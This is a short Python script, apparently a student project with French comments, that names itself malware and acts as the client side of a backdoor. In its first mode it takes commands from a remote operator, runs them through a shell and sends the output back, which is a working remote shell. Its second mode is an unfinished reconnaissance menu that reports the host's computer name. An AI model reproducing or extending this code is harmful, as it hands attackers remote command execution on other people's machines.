from Class_Projet import *
import subprocess


malware = Malware()
malware.start()

choix = malware.receive()

if choix == "1":
    malware.send(os.getcwd() + "> ")
    cmd = malware.receive()
    while cmd != "quit":
        print(cmd)
        if cmd[:2] == "cd":
            os.chdir(cmd[3:])

        var = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_byte = var.stdout.read() + var.stderr.read()
        out_str = out_byte.decode("utf-8", errors="replace")
        malware.send(out_str + "\n" + os.getcwd() + "> ")
        print(out_str)
        cmd = malware.receive()

if choix == "2":
    '''a r√©gler'''
    cmd = malware.receive()
    while cmd != "quit":
        if cmd == "computer":
            malware.send(os.environ["COMPUTERNAME"])
        elif cmd == "current":
            malware.send(os.environ["COMPUTERNAME"])
            '''needed whoami'''
        elif cmd == "network":
            malware.send(os.environ["COMPUTERNAME"])
            '''needed ipconfig'''
        elif cmd == "users":
            malware.send(os.environ["COMPUTERNAME"])
            '''needed list users'''
        else:
            malware.send("Entrez une instruction valide!")
        cmd = malware.receive()
malware.quit()